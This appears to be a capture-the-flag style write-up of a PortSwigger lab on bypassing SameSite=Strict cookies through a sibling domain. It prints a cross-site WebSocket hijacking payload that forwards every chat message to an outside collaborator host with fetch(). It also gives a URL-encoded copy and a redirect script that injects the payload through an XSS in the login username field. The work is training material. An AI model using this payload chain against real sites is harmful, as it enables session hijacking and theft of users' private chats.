## SameSite Strict bypass via sibling domain


<img width="861" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/c7edb606-07a2-43f8-a589-0999888a3326">

## Solutions:

Now we go to the lab website:
![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/e677c6be-0f45-4393-87ac-e206efa9ef2f)


Ok, note that there is a “Live Chat” on the right-hand side on the top. We click that.

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/2d6f3a2a-1cc2-4ec6-976d-e46c87b184c5)

This is because our browser has stored our sessions, and every time we visit this /chat webpage, our browser sends the session value.

The SameSite=Strict property prevents the session from being sent if the web is visited through code (javascript) automatically. But if you are manually changing the address bar to visit the chat webpage, the session is allowed to be sent. And once you visit that /chat through code, your browser won’t send the session value and this value would be forgotten by your browser. This explains why refreshing does not see the chats.

In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:

<script>
    var ws = new WebSocket('wss://0aeb00f70330c49787095bd20001002f.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://q6xfzxmd09sge3zxbmgy9uwqnht8hy5n.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>



Because this exploit visits the /chat webpage by code, thus no sessions would be sent, and you can not see the chat history at all! Since now the session is already forgotten by our browser, we need to re-enter some words in the /chat webpage and sent that again to create some chat history.

This web page contains a cross-site scripting (XSS) vulnerability. You can execute arbitrary javascript code in the Username field.

Store and view the exploit .

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/92ae1443-4d68-4430-a39b-05295f4ebc80)


%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%30%35%30%30%33%33%30%33%34%36%34%61%30%35%38%31%39%31%30%32%34%66%30%30%36%39%30%30%32%36%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%6b%6f%63%73%31%69%76%37%75%73%31%32%69%33%64%38%33%35%68%73%69%79%35%33%68%75%6e%6c%62%62%7a%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter.

<script>
    document.location = "https://cms-0aeb00f70330c49787095bd20001002f.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%30%35%30%30%33%33%30%33%34%36%34%61%30%35%38%31%39%31%30%32%34%66%30%30%36%39%30%30%32%36%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%6b%6f%63%73%31%69%76%37%75%73%31%32%69%33%64%38%33%35%68%73%69%79%35%33%68%75%6e%6c%62%62%7a%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=anything";
</script>

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/d6ec9e39-3c93-41cf-85ce-1770c9da48f7">

<img width="1436" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/20edf134-2797-4ffc-993b-b5169901dd02">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/583e6437-e736-45d0-9743-153023927498">


